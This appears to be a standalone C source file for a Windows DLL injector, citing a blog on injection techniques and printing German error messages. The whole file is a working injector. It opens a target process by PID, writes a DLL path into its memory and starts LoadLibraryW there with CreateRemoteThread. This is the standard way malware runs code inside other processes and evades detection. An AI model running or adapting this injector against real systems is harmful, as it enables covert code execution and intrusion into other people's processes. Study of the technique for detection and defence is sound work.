// https://www.zerodetection.net/blog/understanding-dll-injection-techniques-and-implications
// x86_64-w64-mingw32-gcc dll_injection.c -o dll_injection.exe

#include <windows.h>
#include <stdio.h>

int main(int argc, wchar_t* argv[]) {
    HANDLE processHandle;
    PVOID remoteBuffer;
    //const wchar_t dllPath[] = L"C:\\temp\\messagebox.dll";
    const wchar_t dllPath[] = L"messagebox.dll";

    if (argc != 2) {
        wprintf(L"Verwendung: %s <PID>\n", argv[0]);
        return 1;
    }

    wprintf(L"Injecting DLL to PID: %i\n", _wtoi(argv[1]));

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, _wtoi(argv[1]));
    if (processHandle == NULL) {
        wprintf(L"Fehler beim Öffnen des Prozesses: %d\n", GetLastError());
        return 1;
    }

    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        wprintf(L"Fehler beim Allozieren von virtuellem Speicher im entfernten Prozess: %d\n", GetLastError());
        CloseHandle(processHandle);
        return 1;
    }

    if (!WriteProcessMemory(processHandle, remoteBuffer, dllPath, sizeof(wchar_t) * (wcslen(dllPath) + 1), NULL)) {
        wprintf(L"Fehler beim Schreiben im entfernten Prozess: %d\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);

    if (remoteThread == NULL) {
        wprintf(L"Fehler beim Erstellen des Remote-Threads: %d\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    CloseHandle(remoteThread);
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    return 0;
}
